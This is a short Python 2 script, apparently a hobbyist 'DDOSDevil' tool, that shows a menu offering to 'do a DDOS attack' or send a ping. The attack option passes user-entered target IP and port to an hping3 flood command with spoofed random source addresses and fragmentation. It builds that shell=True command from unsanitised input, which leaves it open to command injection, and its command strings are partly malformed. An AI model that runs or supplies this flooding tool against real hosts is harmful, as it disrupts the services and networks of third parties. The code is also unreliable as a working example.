import time
import socket
import os
import sys
import string
import subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    RED =  '\033[31m'
    UNDERLINE = '\033[4m'


print bcolors.RED

print "____________ _____ ___________           _ _ "
print "|  _  \  _  \  _  /  ___|  _  \         (_) |"
print "| | | | | | | | | \ `--.| | | |_____   ___| |"
print "| | | | | | | | | |`--. \ | | / _ \ \ / / | |"
print "| |/ /| |/ /\ \_/ /\__/ / |/ /  __/\ V /| | |"
print "|___/ |___/  \___/\____/|___/ \___| \_/ |_|_|"
print "                                             "
print " type 1 to do a DDOS attack"
print " type 2 to do a ping"
                                                                                         
print bcolors.ENDC

choice = input("Enter your choice > ")

if choice == 1:

	subprocess.call('clear', shell=True)
	target = raw_input("Enter a target ip > ")
	port = raw_input("Enter the port > ")
	data = raw_input("Enter number of data bytes to send (default is 5000) > ")
	print "Wait during the process start..."
	time.sleep(5)
	subprocess.Popen("hping3 --flood -d " + data + "--frag --rand-source -p " + port + " -A " + target, shell=True)

if choice == 2:

	subprocess.call('clear', shell=True)
	ipping = raw_input("Enter an ip to test > ")
	requests = raw_input("Enter a number of ping request > ")
	subprocess.Popen(["ping", "-c" + requests + "-n", "-W", "2" + ipping])
